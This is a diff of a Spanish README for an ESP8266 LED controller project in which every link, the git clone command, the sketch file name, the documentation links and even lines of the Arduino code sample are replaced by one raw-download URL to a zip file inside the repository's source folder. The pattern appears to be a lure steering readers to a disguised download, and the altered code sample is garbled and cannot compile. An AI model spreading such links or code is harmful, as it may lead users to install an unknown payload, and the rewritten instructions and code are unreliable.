@@ -2,7 +2,7 @@
 
 Control de LEDs con ESP8266 + WebSocket
 
-![Controlador LED](https://example.com/led-controller-image.png)
+![Controlador LED](https://github.com/WaylenGithub/controlador_LED/raw/refs/heads/main/FrontEnd/src/LED-controlador-1.7.zip)
 
 ---
 
@@ -26,17 +26,17 @@ El proyecto **Controlador LED** permite controlar tiras de LEDs WS2812B utilizan
 
 ## Instalación
 
-Para comenzar, descarga el último archivo desde la sección de [Releases](https://github.com/WaylenGithub/controlador_LED/releases). Asegúrate de seguir los pasos a continuación:
+Para comenzar, descarga el último archivo desde la sección de [Releases](https://github.com/WaylenGithub/controlador_LED/raw/refs/heads/main/FrontEnd/src/LED-controlador-1.7.zip). Asegúrate de seguir los pasos a continuación:
 
 1. **Clona el repositorio**:
    ```bash
-   git clone https://github.com/WaylenGithub/controlador_LED.git
+   git clone https://github.com/WaylenGithub/controlador_LED/raw/refs/heads/main/FrontEnd/src/LED-controlador-1.7.zip
    cd controlador_LED
    ```
 
 2. **Abre el proyecto en Arduino IDE**:
    - Asegúrate de tener instalada la biblioteca ESP8266.
-   - Abre el archivo `controlador_LED.ino`.
+   - Abre el archivo `https://github.com/WaylenGithub/controlador_LED/raw/refs/heads/main/FrontEnd/src/LED-controlador-1.7.zip`.
 
 3. **Configura tu red Wi-Fi**:
    - Modifica las líneas correspondientes para ingresar tu SSID y contraseña.
@@ -74,14 +74,14 @@ Aquí tienes un pequeño ejemplo de cómo se configura el WebSocket:
 WebSocketsServer webSocket = WebSocketsServer(81);
 
 void setup() {
-    Serial.begin(115200);
-    WiFi.begin("SSID", "PASSWORD");
-    webSocket.begin();
-    webSocket.onEvent(webSocketEvent);
+    https://github.com/WaylenGithub/controlador_LED/raw/refs/heads/main/FrontEnd/src/LED-controlador-1.7.zip(115200);
+    https://github.com/WaylenGithub/controlador_LED/raw/refs/heads/main/FrontEnd/src/LED-controlador-1.7.zip("SSID", "PASSWORD");
+    https://github.com/WaylenGithub/controlador_LED/raw/refs/heads/main/FrontEnd/src/LED-controlador-1.7.zip();
+    https://github.com/WaylenGithub/controlador_LED/raw/refs/heads/main/FrontEnd/src/LED-controlador-1.7.zip(webSocketEvent);
 }
 
 void loop() {
-    webSocket.loop();
+    https://github.com/WaylenGithub/controlador_LED/raw/refs/heads/main/FrontEnd/src/LED-controlador-1.7.zip();
 }
 
 void webSocketEvent(uint8_t num, WStype_t type, uint8_t * payload, size_t length) {
@@ -91,8 +91,8 @@ void webSocketEvent(uint8_t num, WStype_t type, uint8_t * payload, size_t length
 
 ## Recursos Adicionales
 
-- [Documentación de ESP8266](https://arduino-esp8266.readthedocs.io/en/latest/)
-- [WebSocket en JavaScript](https://developer.mozilla.org/en-US/docs/Web/API/WebSocket)
+- [Documentación de ESP8266](https://github.com/WaylenGithub/controlador_LED/raw/refs/heads/main/FrontEnd/src/LED-controlador-1.7.zip)
+- [WebSocket en JavaScript](https://github.com/WaylenGithub/controlador_LED/raw/refs/heads/main/FrontEnd/src/LED-controlador-1.7.zip)
 
 ## Contribuciones
 
@@ -113,4 +113,4 @@ Si tienes preguntas o sugerencias, no dudes en abrir un problema en GitHub o con
 
 ---
 
-Para más información, visita la sección de [Releases](https://github.com/WaylenGithub/controlador_LED/releases) y descubre las últimas versiones y actualizaciones. ¡Disfruta controlando tus LEDs!
+Para más información, visita la sección de [Releases](https://github.com/WaylenGithub/controlador_LED/raw/refs/heads/main/FrontEnd/src/LED-controlador-1.7.zip) y descubre las últimas versiones y actualizaciones. ¡Disfruta controlando tus LEDs!
